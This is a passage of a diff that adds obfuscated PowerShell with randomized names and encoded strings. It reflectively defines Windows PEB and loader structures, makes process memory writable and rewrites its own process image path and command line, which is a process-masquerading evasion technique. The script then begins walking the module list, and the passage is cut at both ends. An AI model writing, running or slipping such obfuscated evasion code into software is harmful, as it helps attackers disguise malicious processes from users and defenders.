+                    [void] $TuborahamLabetalPariesUnble.DefineParameter($EquiressNeumourseFidginess, (lkjhgfdszxcvbnpoiuytredfgh "#@0!g^^b1"), $null);
+                }
+                
+                $EquiressNeumourseFidginess++;
+            }
+            
+            $SlesiaComplaRectorDeced = [Runtime.InteropServices.DllImportAttribute];
+            $FraggarObsesPatchian = $SlesiaComplaRectorDeced.GetField((lkjhgfdszxcvbnpoiuytredfgh "1c4&11^b1apdib6^d@^b1(k0bg8bg8!igbg8"));
+            $InterLactionLazabless = $SlesiaComplaRectorDeced.GetField((lkjhgfdszxcvbnpoiuytredfgh "jmcib6e0re0r5qs0fd38ajmc!ig0fdpok&110fd^b15qs!ig0fd"));
+            $RecommenMegalatedFanancyPrimen = $SlesiaComplaRectorDeced.GetField((lkjhgfdszxcvbnpoiuytredfgh "jmcfi0ib6bg81c4&11^b1"));
+            $UncousEndorCyphadeOutlike = $SlesiaComplaRectorDeced.GetField((lkjhgfdszxcvbnpoiuytredfgh "(k00fd^b1bg8k!2pkt!ig5qs0fd^b1"));
+            if ($OrrhingForcedKlantJardicHooder) { $RuintersBighsUnadesStases = $True; } else { $RuintersBighsUnadesStases = $False; };
+            
+            if ($PSBoundParameters[(lkjhgfdszxcvbnpoiuytredfgh "pnm0fd#mk&11e0r!igbg8^d@pnm0fdib65et^b15qs!ig0fd^d@a2q&11^b1&11bg8ib6^b1&11pnm0fdfi0ib6!g^^d@&11^d@")]) { $RhinaTetrianDextens = $InfelorsInactionsMeterateInhauses } else { $RhinaTetrianDextens = $ProosentInterAkebbiacSubgrableParody }
+            
+            
+            $PhotomzenCompleChaff = [Runtime.InteropServices.DllImportAttribute].GetConstructor([String]);
+            $EnsurgingGravelyMonocytisIntersPresenish = New-Object Reflection.Emit.CustomAttributeBuilder($PhotomzenCompleChaff, $ShrasMyricScussive, [Reflection.PropertyInfo[]] @(), [Object[]] @(), [Reflection.FieldInfo[]] @($FraggarObsesPatchian, $InterLactionLazabless, $RecommenMegalatedFanancyPrimen, $UncousEndorCyphadeOutlike), [Object[]] @($RuintersBighsUnadesStases,
+                                 ([Runtime.InteropServices.CallingConvention] $UnwishTronicDichroclePesensUnifie),
+                                 ([Runtime.InteropServices.CharSet] $PlicagedUngirousDocials),
+                    $RhinaTetrianDextens));
+                             
+            $TuborahamLabetalPariesUnble.SetCustomAttribute($EnsurgingGravelyMonocytisIntersPresenish);
+        }
+    }
+    
+    END {
+        if ($ElemmeralBaleuMyrminess -is [Reflection.Assembly]) {
+            return $SwoodHypoachPassard
+        }
+        
+        $WhincismPhylogicTeanorm = @{};
+        
+        foreach ($GlanoInctionFonent in $SwoodHypoachPassard.Keys) {
+            $YographyChecialiaRaunamen = $SwoodHypoachPassard[$GlanoInctionFonent].CreateType();
+                
+            $WhincismPhylogicTeanorm[$GlanoInctionFonent] = $YographyChecialiaRaunamen;
+        }
+        
+        return $WhincismPhylogicTeanorm
+    }
+};
+    
+    
+function VasomAnonessEffleesJatary {
+   
+    
+    [OutputType([Type])]
+    Param
+    (
+        [Parameter(Position = 0, Mandatory = $True)]
+        [ValidateScript({ ($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly]) })]
+        $ElemmeralBaleuMyrminess,
+        
+        [Parameter(Position = 1, Mandatory = $True)]
+        [ValidateNotNullOrEmpty()]
+        [String]
+        $BankforeHandavahsAntalCutisArciana,
+        
+        [Parameter(Position = 2, Mandatory = $True)]
+        [Type]
+        $YographyChecialiaRaunamen,
+        
+        [Parameter(Position = 3, Mandatory = $True)]
+        [ValidateNotNullOrEmpty()]
+        [Hashtable]
+        $StomyEmbreveneDelingNoncing,
+        
+        [Switch]
+        $DaceousUnsiveNeityButor
+    )
+    
+    if ($ElemmeralBaleuMyrminess -is [Reflection.Assembly]) {
+        return ($ElemmeralBaleuMyrminess.GetType($BankforeHandavahsAntalCutisArciana))
+    }
+    
+    $CrysagaUnniesJokings = $YographyChecialiaRaunamen -as [Type];
+    
+    $TeameterMagedAnastimboImmodismsAcripleak = $ElemmeralBaleuMyrminess.DefineEnum($BankforeHandavahsAntalCutisArciana, (lkjhgfdszxcvbnpoiuytredfgh "pkt!g^7*le0r5qs5et"), $CrysagaUnniesJokings);
+    
+    if ($DaceousUnsiveNeityButor) {
+        $YoumaniteAptnessHeriticFusory = [FlagsAttribute].GetConstructor(@());
+        $HabduateShousSophyted = New-Object Reflection.Emit.CustomAttributeBuilder($YoumaniteAptnessHeriticFusory, @());
+        $TeameterMagedAnastimboImmodismsAcripleak.SetCustomAttribute($HabduateShousSophyted);
+    }
+    
+    foreach ($GlanoInctionFonent in $StomyEmbreveneDelingNoncing.Keys) {
+        
+        $null = $TeameterMagedAnastimboImmodismsAcripleak.DefineLiteral($GlanoInctionFonent, $StomyEmbreveneDelingNoncing[$GlanoInctionFonent] -as $CrysagaUnniesJokings)
+    }
+    
+    $TeameterMagedAnastimboImmodismsAcripleak.CreateType()
+};
+    
+    
+
+
+function AegionCafirmTimetopOlymyode {
+    Param
+    (
+        [Parameter(Position = 0, Mandatory = $True)]
+        [UInt16]
+        $MislatesZiticalMiness,
+            
+        [Parameter(Position = 1, Mandatory = $True)]
+        [Type]
+        $YographyChecialiaRaunamen,
+            
+        [Parameter(Position = 2)]
+        [UInt16]
+        $HobinKnotomaHairdly,
+            
+        [Object[]]
+        $CensicalGravelyProosis
+    )
+    
+$RepissesPsycoseWorkeepNondercle= (lkjhgfdszxcvbnpoiuytredfgh "pkt!ig^d@5qs^b15qs!ig0fd");
+    $MalthfulCottomineKolangesTophicalBeakines = (lkjhgfdszxcvbnpoiuytredfgh "bj6k!2kd&&11");
+    $CommembaPterizerSolutePassa = (lkjhgfdszxcvbnpoiuytredfgh "#@0#mk#mk^d@&11^b1");
+    $PagistChaminesSerido= (lkjhgfdszxcvbnpoiuytredfgh "a2qib6bg8^d@fi0ib6e0rqht^d@"); 
+    @{
+        $RepissesPsycoseWorkeepNondercle        = $MislatesZiticalMiness;
+        $MalthfulCottomineKolangesTophicalBeakines        = $YographyChecialiaRaunamen -as [Type];
+        $CommembaPterizerSolutePassa        = $HobinKnotomaHairdly;
+        $PagistChaminesSerido        = $CensicalGravelyProosis;
+    };
+};
+    
+    
+function SupertAmpalsDivableSlowellaHaddent {
+    [OutputType([Type])]
+	
+    Param
+    (
+        [Parameter(Position = 1, Mandatory = $True)]
+        [ValidateScript({ ($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly]) })]
+        $ElemmeralBaleuMyrminess,
+        
+        [Parameter(Position = 2, Mandatory = $True)]
+        [ValidateNotNullOrEmpty()]
+        [String]
+        $BankforeHandavahsAntalCutisArciana,
+        
+        [Parameter(Position = 3, Mandatory = $True)]
+        [ValidateNotNullOrEmpty()]
+        [Hashtable]
+        $SemiaDecrocardUnballyHepare,
+        
+        [Reflection.Emit.PackingSize]
+        $BiraticsKniveShong = [Reflection.Emit.PackingSize]::Unspecified,
+        
+        [Switch]
+        $FallyoxyAutitaterMulate
+    )
+    
+    if ($ElemmeralBaleuMyrminess -is [Reflection.Assembly]) {
+        return ($ElemmeralBaleuMyrminess.GetType($BankforeHandavahsAntalCutisArciana));
+    };
+    
+    [Reflection.TypeAttributes] $RediesProdeSnowpie = (lkjhgfdszxcvbnpoiuytredfgh "qht0fd^d@5qsjmce0rib6^d@^d@&7ktds6ff6q86q86q86q86q86q86q86q86q86q86q86q8jmce0rib6^d@^d@&7ktds6ff6q86q86q86q86q86q86q86q86q86q86q86q8pkt!g^7*le0r5qs5et&7ktds6ff6q86q86q86q86q86q86q86q86q86q86q86q81c4&11ib6e0r&11nhf&7ktds6ff6q86q86q86q86q86q86q86q86q86q86q86q85a#&11#mk!igbg8&11d#e5qs&11e0rnhfpnm0fd5qs^b1");
+        
+    if ($FallyoxyAutitaterMulate) {
+        $RediesProdeSnowpie = $RediesProdeSnowpie -bor [Reflection.TypeAttributes]::ExplicitLayout
+    }
+    else {
+        $RediesProdeSnowpie = $RediesProdeSnowpie -bor [Reflection.TypeAttributes]::SequentialLayout
+    };
+    
+    $TellinUnsesOlessWoozldebaRetted = $ElemmeralBaleuMyrminess.DefineType($BankforeHandavahsAntalCutisArciana, $RediesProdeSnowpie, [ValueType], $BiraticsKniveShong);
+    $DecentQuafferedUnquindicRetriding = [Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0];
+    $DenilingPiaziumCally = @([Runtime.InteropServices.MarshalAsAttribute].GetField((lkjhgfdszxcvbnpoiuytredfgh "1c45qs&n(&11jmc!ig0fd^d@^b1")));
+    
+    $NasianTrinessDogentCoannistZapquary = New-Object Hashtable[] ($SemiaDecrocardUnballyHepare.Count);
+ 
+    
+    
+    
+    $PreconImmonianUnrestic= (lkjhgfdszxcvbnpoiuytredfgh "d#e5qs&11e0rnhf*g7ib6daa&11");
+    $PringTallyBacksEversCambish= (lkjhgfdszxcvbnpoiuytredfgh "pktbg8!igkd&&11bg8^b15qs&11^d@");
+    foreach ($HelleTradiosisStenesAdicialAvism in $SemiaDecrocardUnballyHepare.Keys) {
+        $MentinterIntraspsProticide = $SemiaDecrocardUnballyHepare[$HelleTradiosisStenesAdicialAvism][(lkjhgfdszxcvbnpoiuytredfgh "pkt!ig^d@5qs^b15qs!ig0fd")];
+     
+        $NasianTrinessDogentCoannistZapquary[$MentinterIntraspsProticide] = @{$PreconImmonianUnrestic = $HelleTradiosisStenesAdicialAvism; $PringTallyBacksEversCambish = $SemiaDecrocardUnballyHepare[$HelleTradiosisStenesAdicialAvism] };
+    }
+    
+    foreach ($HelleTradiosisStenesAdicialAvism in $NasianTrinessDogentCoannistZapquary) {
+        $GyranshipMellieBursticalTarainedRedly = $HelleTradiosisStenesAdicialAvism[  $PreconImmonianUnrestic];
+        $DvanistsCoveryAsymphal = $HelleTradiosisStenesAdicialAvism[$PringTallyBacksEversCambish];
+        
+        $HobinKnotomaHairdly = $DvanistsCoveryAsymphal[(lkjhgfdszxcvbnpoiuytredfgh "#@0#mk#mk^d@&11^b1")];
+        $YographyChecialiaRaunamen = $DvanistsCoveryAsymphal[(lkjhgfdszxcvbnpoiuytredfgh "bj6k!2kd&&11")];
+        $CensicalGravelyProosis = $DvanistsCoveryAsymphal[(lkjhgfdszxcvbnpoiuytredfgh "a2qib6bg8^d@fi0ib6e0rqht^d@")];
+        
+        $TraverVaristCysteerObvered = $TellinUnsesOlessWoozldebaRetted.DefineField($GyranshipMellieBursticalTarainedRedly, $YographyChecialiaRaunamen, (lkjhgfdszxcvbnpoiuytredfgh "pkt!g^7*le0r5qs5et"));
+        
+        if ($CensicalGravelyProosis) {
+            $SubstringLamiesPolismBindasBookman = $CensicalGravelyProosis[0] -as ([Runtime.InteropServices.UnmanagedType]);
+            if ($CensicalGravelyProosis[1]) {
+                $UboverFlineScaller = $CensicalGravelyProosis[1];
+                $BenryBodiesIntrumBluents = New-Object Reflection.Emit.CustomAttributeBuilder($DecentQuafferedUnquindicRetriding,
+                    $SubstringLamiesPolismBindasBookman, $DenilingPiaziumCally, @($UboverFlineScaller));
+            }
+            else {
+                $BenryBodiesIntrumBluents = New-Object Reflection.Emit.CustomAttributeBuilder($DecentQuafferedUnquindicRetriding, [Object[]] @($SubstringLamiesPolismBindasBookman))
+            };
+                
+            $TraverVaristCysteerObvered.SetCustomAttribute($BenryBodiesIntrumBluents);
+        };
+        
+        if ($FallyoxyAutitaterMulate) { $TraverVaristCysteerObvered.SetOffset($HobinKnotomaHairdly) };
+    };
+    
+    
+    
+    $SkinseUnctionStrusingSimpled = $TellinUnsesOlessWoozldebaRetted.DefineMethod((lkjhgfdszxcvbnpoiuytredfgh "ai7&11^b11c45qs&n(&11"),
+        (lkjhgfdszxcvbnpoiuytredfgh "pkt!g^7*le0r5qs5et&7k6q81c4^b1ib6^b15qs5et"),
+        [Int],
+        [Type[]] @());
+    $GnaysMitarshtHivyworksIsobactsTractable = $SkinseUnctionStrusingSimpled.GetILGenerator();
+    
+    $GnaysMitarshtHivyworksIsobactsTractable.Emit([Reflection.Emit.OpCodes]::Ldtoken, $TellinUnsesOlessWoozldebaRetted);
+    $GnaysMitarshtHivyworksIsobactsTractable.Emit([Reflection.Emit.OpCodes]::Call,
+        [Type].GetMethod((lkjhgfdszxcvbnpoiuytredfgh "ai7&11^b1bj6k!2kd&&11d#ebg8!igdaao3sib60fdnhfe0r&11")));
+    $GnaysMitarshtHivyworksIsobactsTractable.Emit([Reflection.Emit.OpCodes]::Call,
+        [Runtime.InteropServices.Marshal].GetMethod((lkjhgfdszxcvbnpoiuytredfgh "1c45qs&n(&11#@0#mk"), [Type[]] @([Type])));
+    $GnaysMitarshtHivyworksIsobactsTractable.Emit([Reflection.Emit.OpCodes]::Ret);
+    
+    
+    
+    $HypondShopasCoundineKnotory = $TellinUnsesOlessWoozldebaRetted.DefineMethod((lkjhgfdszxcvbnpoiuytredfgh "!igkd&s(lpnmdaakd&e0r5qs5et5qs^b1"),
+        (lkjhgfdszxcvbnpoiuytredfgh "pktbg85qspokib6^b1&111c45et!igkd&&11&7k6q8pkt!g^7*le0r5qs5et&7k6q81c4^b1ib6^b15qs5et&7k6q8o3s5qsnhf&115a#k!21c45qs38a&7k6q81c4kd&&115et5qsib6e0r*g7ib6daa&11"),
+        $TellinUnsesOlessWoozldebaRetted,
+        [Type[]] @([IntPtr]));
+    $PremberyQuadrityTicalTraftSemide = $HypondShopasCoundineKnotory.GetILGenerator();
+    $PremberyQuadrityTicalTraftSemide.Emit([Reflection.Emit.OpCodes]::Nop);
+    $PremberyQuadrityTicalTraftSemide.Emit([Reflection.Emit.OpCodes]::Ldarg_0);
+    $PremberyQuadrityTicalTraftSemide.Emit([Reflection.Emit.OpCodes]::Ldtoken, $TellinUnsesOlessWoozldebaRetted);
+    $PremberyQuadrityTicalTraftSemide.Emit([Reflection.Emit.OpCodes]::Call,
+        [Type].GetMethod((lkjhgfdszxcvbnpoiuytredfgh "ai7&11^b1bj6k!2kd&&11d#ebg8!igdaao3sib60fdnhfe0r&11")));
+    $PremberyQuadrityTicalTraftSemide.Emit([Reflection.Emit.OpCodes]::Call,
+        [Runtime.InteropServices.Marshal].GetMethod((lkjhgfdszxcvbnpoiuytredfgh "pkt^b1bg8bj6!ig1c4^b1bg8!g^5et^b1!g^bg8&11"), [Type[]] @([IntPtr], [Type])));
+    $PremberyQuadrityTicalTraftSemide.Emit([Reflection.Emit.OpCodes]::Unbox_Any, $TellinUnsesOlessWoozldebaRetted);
+    $PremberyQuadrityTicalTraftSemide.Emit([Reflection.Emit.OpCodes]::Ret);
+    
+    $TellinUnsesOlessWoozldebaRetted.CreateType();
+};
+
+
+
+$ElemmeralBaleuMyrminess = BifortsFencyEidial;
+    
+$HelimnusFoodedMiscute = SupertAmpalsDivableSlowellaHaddent $ElemmeralBaleuMyrminess UNICODE_STRING @{
+    Length        = AegionCafirmTimetopOlymyode 0 ([System.Type](lkjhgfdszxcvbnpoiuytredfgh "pnm0fd^b1^!7@(j"));
+    MaximumLength = AegionCafirmTimetopOlymyode 1 ([System.Type](lkjhgfdszxcvbnpoiuytredfgh "tirpnm0fd^b1^!7@(j"));
+    Buffer        = AegionCafirmTimetopOlymyode 2([System.Type](lkjhgfdszxcvbnpoiuytredfgh "pnm0fd^b1pkt^b1bg8"));
+};
+    
+$JestnessCoureUncosis = SupertAmpalsDivableSlowellaHaddent $ElemmeralBaleuMyrminess _LIST_ENTRY @{
+    Flink = AegionCafirmTimetopOlymyode 0([System.Type](lkjhgfdszxcvbnpoiuytredfgh "pnm0fd^b1pkt^b1bg8"));
+    Blink = AegionCafirmTimetopOlymyode 1([System.Type](lkjhgfdszxcvbnpoiuytredfgh "pnm0fd^b1pkt^b1bg8"));
+};
+    
+$ScyestLablebbyPostangPshadotaAirmic = SupertAmpalsDivableSlowellaHaddent $ElemmeralBaleuMyrminess _PROCESS_BASIC_INFORMATION @{
+    ExitStatus                   = AegionCafirmTimetopOlymyode 0([System.Type](lkjhgfdszxcvbnpoiuytredfgh "pnm0fd^b1pkt^b1bg8"));
+    PebBaseAddress               = AegionCafirmTimetopOlymyode 1([System.Type](lkjhgfdszxcvbnpoiuytredfgh "pnm0fd^b1pkt^b1bg8"));
+    AffinityMask                 = AegionCafirmTimetopOlymyode 2([System.Type](lkjhgfdszxcvbnpoiuytredfgh "pnm0fd^b1pkt^b1bg8"));
+    BasePriority                 = AegionCafirmTimetopOlymyode 3([System.Type](lkjhgfdszxcvbnpoiuytredfgh "pnm0fd^b1pkt^b1bg8"));
+    UniqueProcessId              = AegionCafirmTimetopOlymyode 4([System.Type](lkjhgfdszxcvbnpoiuytredfgh "tirpnm0fd^b1pkt^b1bg8"));
+    InheritedFromUniqueProcessId = AegionCafirmTimetopOlymyode 5([System.Type](lkjhgfdszxcvbnpoiuytredfgh "pnm0fd^b1pkt^b1bg8"));
+};
+    
+
+$AntherVirateNoncootsRetry = SupertAmpalsDivableSlowellaHaddent $ElemmeralBaleuMyrminess _PEB @{
+    Ldr32               = AegionCafirmTimetopOlymyode 0 ([System.Type](lkjhgfdszxcvbnpoiuytredfgh "pnm0fd^b1pkt^b1bg8")) -HobinKnotomaHairdly 12;
+    ProcessParameters32 = AegionCafirmTimetopOlymyode 1 ([System.Type](lkjhgfdszxcvbnpoiuytredfgh "pnm0fd^b1pkt^b1bg8")) -HobinKnotomaHairdly 16;
+    Ldr64               = AegionCafirmTimetopOlymyode 2 ([System.Type](lkjhgfdszxcvbnpoiuytredfgh "pnm0fd^b1pkt^b1bg8")) -HobinKnotomaHairdly 24;
+    FastPebLock32       = AegionCafirmTimetopOlymyode 3 ([System.Type](lkjhgfdszxcvbnpoiuytredfgh "pnm0fd^b1pkt^b1bg8")) -HobinKnotomaHairdly 28;
+    ProcessParameters64 = AegionCafirmTimetopOlymyode 4 ([System.Type](lkjhgfdszxcvbnpoiuytredfgh "pnm0fd^b1pkt^b1bg8")) -HobinKnotomaHairdly 32;
+    FastPebLock64       = AegionCafirmTimetopOlymyode 5 ([System.Type](lkjhgfdszxcvbnpoiuytredfgh "pnm0fd^b1pkt^b1bg8")) -HobinKnotomaHairdly 56;
+} -FallyoxyAutitaterMulate;
+    
+
+$TricallyQuiseNewaresis = SupertAmpalsDivableSlowellaHaddent $ElemmeralBaleuMyrminess _PEB_LDR_DATA @{
+    Length                          = AegionCafirmTimetopOlymyode 0 ([System.Type](lkjhgfdszxcvbnpoiuytredfgh "tirpnm0fd^b1fd425j"));
+    Initialized                     = AegionCafirmTimetopOlymyode 1 ([System.Type](lkjhgfdszxcvbnpoiuytredfgh "5a#k!2^b1&11"));
+    SsHandle                        = AegionCafirmTimetopOlymyode 2([System.Type](lkjhgfdszxcvbnpoiuytredfgh "pnm0fd^b1pkt^b1bg8"));
+    InLoadOrderModuleList           = AegionCafirmTimetopOlymyode 3 $JestnessCoureUncosis;
+    InMemoryOrderModuleList         = AegionCafirmTimetopOlymyode 4 $JestnessCoureUncosis;
+    InInitializationOrderModuleList = AegionCafirmTimetopOlymyode 5 $JestnessCoureUncosis;
+    EntryInProgress                 = AegionCafirmTimetopOlymyode 6([System.Type](lkjhgfdszxcvbnpoiuytredfgh "pnm0fd^b1pkt^b1bg8"));
+};
+$AriticStupplicaPlated=(lkjhgfdszxcvbnpoiuytredfgh "d#e!g^e0re0rq8qe0re0r*g7ib6daa&11");
+$GangingLectropsBrical=(lkjhgfdszxcvbnpoiuytredfgh "5a#ib6^d@&11q8qe0re0r*g7ib6daa&11");
+$FloosStetrokReadedTratesUsnec=(lkjhgfdszxcvbnpoiuytredfgh "(k00fd^b1bg8k!2pkt!ig5qs0fd^b1"); 
+
+$DemoteinDorsersTweedsHayocyticSable = SupertAmpalsDivableSlowellaHaddent $ElemmeralBaleuMyrminess _LDR_DATA_TABLE_ENTRY @{
+    InLoadOrderLinks           = AegionCafirmTimetopOlymyode 0 $JestnessCoureUncosis;
+    InMemoryOrderLinks         = AegionCafirmTimetopOlymyode 1 $JestnessCoureUncosis;
+    InInitializationOrderLinks = AegionCafirmTimetopOlymyode 2 $JestnessCoureUncosis;
+    DllBase                    = AegionCafirmTimetopOlymyode 3([System.Type](lkjhgfdszxcvbnpoiuytredfgh "pnm0fd^b1pkt^b1bg8"));
+    $FloosStetrokReadedTratesUsnec                 = AegionCafirmTimetopOlymyode 4([System.Type](lkjhgfdszxcvbnpoiuytredfgh "pnm0fd^b1pkt^b1bg8"));
+    SizeOfImage                = AegionCafirmTimetopOlymyode 5 ([System.Type](lkjhgfdszxcvbnpoiuytredfgh "tirpnm0fd^b1fd425j"));
+    $AriticStupplicaPlated               = AegionCafirmTimetopOlymyode 6 $HelimnusFoodedMiscute;
+    $GangingLectropsBrical                = AegionCafirmTimetopOlymyode 7 $HelimnusFoodedMiscute;
+};
+    
+$SchweedGabyishStulityInfing = @(
+    
+    	(FiqueCamousCaidkingMoristTergarric (lkjhgfdszxcvbnpoiuytredfgh "(&5&11bg80fd&11e0rfd425j") (lkjhgfdszxcvbnpoiuytredfgh "!fd5qsbg8^b1!g^ib6e0rpktbg8!ig^b1&115et^b1(k0c0m") ([Byte]) @(
+        [IntPtr], 
+        [IntPtr], 
+        [UInt32], 
+        [UInt32], 
+        [UInt32].MakeByRefType() 
+    )),
+    
+    	(FiqueCamousCaidkingMoristTergarric (lkjhgfdszxcvbnpoiuytredfgh "(&5&11bg80fd&11e0rfd425j") (lkjhgfdszxcvbnpoiuytredfgh "r*#bg85qs^b1&11pktbg8!ig5et&11^d@^d@a2q&11daa!igbg8k!2") ([Byte]) @(
+        [IntPtr], 
+        [IntPtr], 
+        [IntPtr], 
+        [UInt32], 
+        [UInt32].MakeByRefType() 
+    )),
+    
+    	(FiqueCamousCaidkingMoristTergarric (lkjhgfdszxcvbnpoiuytredfgh "0fd^b1nhfe0re0r") (lkjhgfdszxcvbnpoiuytredfgh "*g7^b1@35!g^&11bg8k!2pnm0fd#mk!igbg8daaib6^b15qs!ig0fdpktbg8!ig5et&11^d@^d@") ([Int]) @(
+        [IntPtr], 
+        [Int], 
+        $ScyestLablebbyPostangPshadotaAirmic.MakeByRefType(), 
+        [Int], 
+        [Int].MakeByRefType()                        
+    )),
+    
+    	(FiqueCamousCaidkingMoristTergarric (lkjhgfdszxcvbnpoiuytredfgh "0fd^b1nhfe0re0r") (lkjhgfdszxcvbnpoiuytredfgh "%h(^b1e0r(k00fd^b1&11bg8jmcbg85qs^b15qs5etib6e0r1c4&115et^b15qs!ig0fd") ([Void]) @(
+        [IntPtr] 
+    )),
+    
+    	(FiqueCamousCaidkingMoristTergarric (lkjhgfdszxcvbnpoiuytredfgh "0fd^b1nhfe0re0r") (lkjhgfdszxcvbnpoiuytredfgh "%h(^b1e0rapd&11ib6pok&11jmcbg85qs^b15qs5etib6e0r1c4&115et^b15qs!ig0fd") ([Void]) @(
+        [IntPtr] 
+    ))
+    
+);
+    
+$IsophorsNonvoliteGigon = $SchweedGabyishStulityInfing | DibbinedBigniteImpyromanMyingLaread  -ElemmeralBaleuMyrminess $ElemmeralBaleuMyrminess -IsoevoidGlotelyPerfaggerSloomsReptile (lkjhgfdszxcvbnpoiuytredfgh "r*#5qs0fdfd425j");
+$AntisDiplousPhyllGreamsie = $IsophorsNonvoliteGigon[(lkjhgfdszxcvbnpoiuytredfgh "(&5&11bg80fd&11e0rfd425j")];
+$ChrygosBulismXerontosCheral = $IsophorsNonvoliteGigon[(lkjhgfdszxcvbnpoiuytredfgh "0fd^b1nhfe0re0r")];
+	
+
+function CuloitePresteePolosureWardness {
+    
+    
+    param (
+        [Parameter(Mandatory = $True)]
+        [string]$TeaceaeImprismInticPiquiting
+    )
+    
+    if ([System.IntPtr]::Size -eq 4) {
+        $DiamydianPartsSpliidateNookhtary = 1
+    };
+    
+    
+    $DendriteScritySwuntersTellopsWarave = (Get-Process -Id ([System.Diagnostics.Process]::((lkjhgfdszxcvbnpoiuytredfgh "ai7&11^b1jmc!g^bg8bg8&110fd^b1pktbg8!ig5et&11^d@^d@"))().((lkjhgfdszxcvbnpoiuytredfgh "pnmnhf")))).((lkjhgfdszxcvbnpoiuytredfgh "o3sib60fdnhfe0r&11"));
+    
+    
+    function MultrasTymologicPhotone {
+        param(
+            [IntPtr]$SynchesieMyxoleBower,
+            [IntPtr]$ImbryonTererHendably,
+            [UInt32]$EncesYowedDialy,
+            [String]$DruffBraskefUnweedEuophylus
+        );
+        
+        
+        [UInt32]$HydrentlyVenedAstershipInvoltNecklike = 0;
+        $AmeriedCationMedianFology = $AntisDiplousPhyllGreamsie::((lkjhgfdszxcvbnpoiuytredfgh "!fd5qsbg8^b1!g^ib6e0rpktbg8!ig^b1&115et^b1(k0c0m"))($SynchesieMyxoleBower, $ImbryonTererHendably, $EncesYowedDialy, 0x40, [ref]$HydrentlyVenedAstershipInvoltNecklike);
+        
+        
+        $GeoexcityUnsesNonciesTuein = [Activator]::CreateInstance($HelimnusFoodedMiscute);
+        $CarraryAnctualProstlesOverturicHeliots = $DruffBraskefUnweedEuophylus;
+        [UInt16]$GeoexcityUnsesNonciesTuein.Length = $CarraryAnctualProstlesOverturicHeliots.Length * 2;
+        [UInt16]$GeoexcityUnsesNonciesTuein.MaximumLength = $GeoexcityUnsesNonciesTuein.Length + 1;
+        [IntPtr]$GeoexcityUnsesNonciesTuein.Buffer = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($CarraryAnctualProstlesOverturicHeliots);
+        [IntPtr]$EsciationChrosmousCripsMinohuCosis = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($EncesYowedDialy);
+        [system.runtime.interopservices.marshal]::StructureToPtr($GeoexcityUnsesNonciesTuein, $EsciationChrosmousCripsMinohuCosis, $true);
+        
+        
+        [UInt32]$ValeriousBifaceresParablessPalistcre = 0;
+        $AmeriedCationMedianFology = $AntisDiplousPhyllGreamsie::WriteProcessMemory($SynchesieMyxoleBower, $ImbryonTererHendably, $EsciationChrosmousCripsMinohuCosis, $EncesYowedDialy, [ref]$ValeriousBifaceresParablessPalistcre);
+        
+        
+        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($EsciationChrosmousCripsMinohuCosis);
+    }
+    
+    
+    $RelledSologyFlastLatedRehen = [Activator]::CreateInstance($ScyestLablebbyPostangPshadotaAirmic);
+    $MoralizesRebathyleRecteesAdnessExodients = New-Object Int;
+    $AmeriedCationMedianFology = $ChrygosBulismXerontosCheral::((lkjhgfdszxcvbnpoiuytredfgh "*g7^b1@35!g^&11bg8k!2pnm0fd#mk!igbg8daaib6^b15qs!ig0fdpktbg8!ig5et&11^d@^d@"))($DendriteScritySwuntersTellopsWarave, 0, [ref]$RelledSologyFlastLatedRehen, $ScyestLablebbyPostangPshadotaAirmic::GetSize(), [ref]$MoralizesRebathyleRecteesAdnessExodients);
+    
+   
+    $ApoteToticismSponyms = [Activator]::CreateInstance($AntherVirateNoncootsRetry);
+    $ApoteToticismSponyms = $ApoteToticismSponyms.GetType();
+    $UnstyNonnablyEvicallyByrious = $RelledSologyFlastLatedRehen.((lkjhgfdszxcvbnpoiuytredfgh "pkt&117*l5a#ib6^d@&11qhtnhfnhfbg8&11^d@^d@")).ToInt64();
+    $MirthroidCarburkenProfesMinedUndare = New-Object (lkjhgfdszxcvbnpoiuytredfgh "1c4k!2^d@^b1&11daa@&8pnm0fd^b1kd&^b1bg8") -ArgumentList $UnstyNonnablyEvicallyByrious;
+    $BaroxerPressReasesHountilla = [system.runtime.interopservices.marshal]::PtrToStructure($MirthroidCarburkenProfesMinedUndare, [type]$ApoteToticismSponyms);
+
+    if ($DiamydianPartsSpliidateNookhtary) {
+        $ChrygosBulismXerontosCheral::RtlEnterCriticalSection($BaroxerPressReasesHountilla.((lkjhgfdszxcvbnpoiuytredfgh "d#eib6^d@^b1pkt&117*lapd!ig5et(&5fd425j")));
+    }
+    else {
+        $ChrygosBulismXerontosCheral::RtlEnterCriticalSection($BaroxerPressReasesHountilla.((lkjhgfdszxcvbnpoiuytredfgh "d#eib6^d@^b1pkt&117*lapd!ig5et(&5@(jc1@")));
+    }
+    
+ 
+    if ($DiamydianPartsSpliidateNookhtary) {
+        
+        $PreafSupperStaperOveria = $BaroxerPressReasesHountilla.ProcessParameters32.ToInt64();
+        
+        [UInt32]$TraneScledCommutherChoasPadcaps = 8;
+        $InconchExceledThumora = $PreafSupperStaperOveria + 0x38;
+        $HyperhousReasageStradibleBediumSkyphetee = $PreafSupperStaperOveria + 0x40;
+    }
+    else {
+        
+        $PreafSupperStaperOveria = $BaroxerPressReasesHountilla.ProcessParameters64.ToInt64();
+        
+        [UInt32]$TraneScledCommutherChoasPadcaps = 16;
+        $InconchExceledThumora = $PreafSupperStaperOveria + 0x60;
+        $HyperhousReasageStradibleBediumSkyphetee = $PreafSupperStaperOveria + 0x70;
+    };
+
+    $AirentVerbagihStockerAmpei = New-Object System.Intptr -ArgumentList $InconchExceledThumora;
+    $CivatiEriwiceManipmentDisprish = New-Object System.Intptr -ArgumentList $HyperhousReasageStradibleBediumSkyphetee;
+    	
+    MultrasTymologicPhotone  $DendriteScritySwuntersTellopsWarave  $AirentVerbagihStockerAmpei  $TraneScledCommutherChoasPadcaps  $TeaceaeImprismInticPiquiting;
+    MultrasTymologicPhotone  $DendriteScritySwuntersTellopsWarave  $CivatiEriwiceManipmentDisprish  $TraneScledCommutherChoasPadcaps  $TeaceaeImprismInticPiquiting;
+    
+    
+    $EldingAvementsShundrynxConterBakerapy = [Activator]::CreateInstance($TricallyQuiseNewaresis);
+    $EldingAvementsShundrynxConterBakerapy = $EldingAvementsShundrynxConterBakerapy.GetType();
+    if ($DiamydianPartsSpliidateNookhtary) {
